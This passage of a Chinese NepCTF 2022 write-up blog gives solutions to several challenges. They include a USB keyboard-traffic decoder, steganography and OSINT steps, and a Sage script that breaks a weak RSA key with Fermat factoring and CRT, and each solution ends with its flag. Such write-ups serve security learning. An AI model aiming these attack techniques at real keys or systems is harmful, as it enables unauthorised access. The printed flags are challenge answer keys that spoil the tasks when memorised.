class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到 <code>welcometonepctf2nd</code>，加分隔符得flag：<code>nepctf&#123;welcome_to_nepctf_2nd&#125;</code>。</p><p>​    </p><h3 id="花花画画画花花"><a href="#花花画画画花花" class="headerlink" title="花花画画画花花"></a>花花画画画花花</h3><blockquote><p>花花画了一张图，你能看出来她画的是什么吗</p><p>(flag格式为NepCTF{})</p></blockquote><p>在 <a href="https://osu.ppy.sh/wiki/zh/Client/File_formats">osu! wiki</a> 可以发现osz文件为可执行的osu!谱面文件，下载安装osu!，</p><p>根据 <code>生成的 .osz 文件会被放置在 osu! 文件夹下的 &quot;Exports&quot; 文件夹里</code>，将osz文件放入 <code>Exports</code> 文件夹，打开osu!，</p><p>在Edit页面看完整首歌曲的乐谱轨迹，拿到flag：<code>NepCTF&#123;MASTER_OF_坏女人！&#125;</code>。</p><p>​    </p><h3 id="少见的bbbbase"><a href="#少见的bbbbase" class="headerlink" title="少见的bbbbase"></a>少见的bbbbase</h3><blockquote><p>少见的bbbbase</p></blockquote><p>尝试几种常见jpg隐写，发现是jphide隐写，用JPHS工具seek（无密码），得到 <code>KkYWdvCQcLYewSUUy5TtQc9AMa</code></p><p>base58解得flag：<code>flag&#123;Real_qiandao~&#125;</code>。</p><p>​    </p><h3 id="9点直播"><a href="#9点直播" class="headerlink" title="9点直播"></a>9点直播</h3><blockquote><p>各位同学，比赛已经开始将近十个小时啦，大家玩的如何呢？邀请大家9点来直播间聊聊天~ 请锁定<a href="https://b23.tv/bn0pPAR">https://b23.tv/bn0pPAR</a><br>这边小助手收到了大家想暴打出题人的反馈，今晚9点我们请到了变态的出题人们，在直播间和大家交流，放出我们的hint，帮助大家解题。<br>同时也会在直播间中抽幸运的小伙伴送出我们的周边礼品。</p></blockquote><p>看B站直播拿flag：<code>NepCTF&#123;bad_woman_nb!&#125;</code>。</p><p>​    </p><h3 id="馅饼？陷阱！"><a href="#馅饼？陷阱！" class="headerlink" title="馅饼？陷阱！"></a>馅饼？陷阱！</h3><blockquote><p>好兄弟中奖了，但是要先汇款。他去哪了？</p><p>NepCTF{银行官网网址}</p></blockquote><p>OSINT题。</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717235016617.png" alt="image-20220717235016617"></p><p>用Yandex识别图1里的黄色建筑，可得到结果为<strong>豪威海景大酒店</strong>，再在百度地图里搜索在海南三亚，附近银行为<strong>光大银行</strong>，</p><p>官网网址即flag：<code>NepCTF&#123;www.cebbank.com&#125;</code>。</p><p>​    </p><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><blockquote><p><a href="https://www.wjx.cn/vm/mjlLAVV.aspx">https://www.wjx.cn/vm/mjlLAVV.aspx</a></p></blockquote><p>答问卷暴打出题人，拿flag：<code>NepCTF&#123;see_you_NepCTF_2023&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>Have you heard of the Chinese Remainder Theorem?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,is_prime,invert,bit_length, next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    (p,q,n,e,d) = (<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = next_prime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     q = p + 1</span></span><br><span class="line"><span class="comment">#     while(True):</span></span><br><span class="line"><span class="comment">#         q += 2 if q &amp; 1 else 1</span></span><br><span class="line"><span class="comment">#         if is_prime(q, 30):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    par = (p,q,n,e,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">par, c</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here&#x27;s something for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_p =&quot;</span>,c % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_q =&quot;</span>,c % q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">message, par</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">    c = powmod(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    par = gen_key()</span><br><span class="line">    c = enc(flag, par)</span><br><span class="line">    leak(par, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Here&#x27;s something for you.</span></span><br><span class="line"><span class="string">n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816</span></span><br><span class="line"><span class="string">c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解和CRT应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n =</span><br><span class="line">q = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    q = gmpy2.next_prime(q)</span><br><span class="line">    <span class="keyword">if</span> n%q == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = n//q</span><br><span class="line">cp =</span><br><span class="line">cq =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = crt([cp,cq],[p,q])</span><br><span class="line">d = inverse_mod(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="p-or-s"><a href="#p-or-s" class="headerlink" title="p or s"></a>p or s</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>what are the differences between P and S？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(keys)==<span class="number">6</span>)</span><br><span class="line">Pbox=[</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, 